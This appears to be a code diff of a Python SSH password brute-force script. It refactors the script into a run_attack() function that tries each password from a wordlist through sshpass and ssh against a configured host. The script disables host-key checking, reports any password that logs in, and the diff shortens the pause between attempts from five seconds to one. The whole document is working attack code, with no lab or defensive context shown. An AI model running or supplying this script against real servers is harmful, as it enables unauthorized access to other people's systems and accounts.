@@ -4,38 +4,46 @@ import time
 from config import SSH_HOST, SSH_PORT, SSH_USER
 
 
-with open("wordlists/passwords.txt", "r") as file:
-    for password in file:
-        password = password.strip()
+def run_attack():
 
-        if not password:
-            continue
+    with open("wordlists/passwords.txt") as file:
 
-        print(f"Trying: {password}")
+        for password in file:
 
-        result = subprocess.run(
-            [
-                "sshpass",
-                "-p", password,
-                "ssh",
-                "-p", str(SSH_PORT),
-                "-o", "StrictHostKeyChecking=no",
-                "-o", "UserKnownHostsFile=/dev/null",
-                f"{SSH_USER}@{SSH_HOST}",
-                "echo Connected"
-            ],
-            capture_output=True,
-            text=True
-        )
+            password = password.strip()
 
-        print("Exit code:", result.returncode)
-        print("STDOUT:", result.stdout)
-        print("STDERR:", result.stderr)
+            if not password:
+                continue
 
-        print("Exit code:", result.returncode)
+            print(f"Trying: {password}")
 
-        if result.returncode == 0:
-            print(f"[+] Password found: {password}")
-            break
+            result = subprocess.run(
+                [
+                    "sshpass",
+                    "-p",
+                    password,
+                    "ssh",
+                    "-p",
+                    str(SSH_PORT),
+                    "-o",
+                    "StrictHostKeyChecking=no",
+                    "-o",
+                    "UserKnownHostsFile=/dev/null",
+                    f"{SSH_USER}@{SSH_HOST}",
+                    "echo Connected"
+                ],
+                capture_output=True,
+                text=True
+            )
 
-        time.sleep(5)
+            if result.returncode == 0:
+                print(f"[+] Password found: {password}")
+                return result
+
+            time.sleep(1)
+
+    return None
+
+
+if __name__ == "__main__":
+    run_attack()
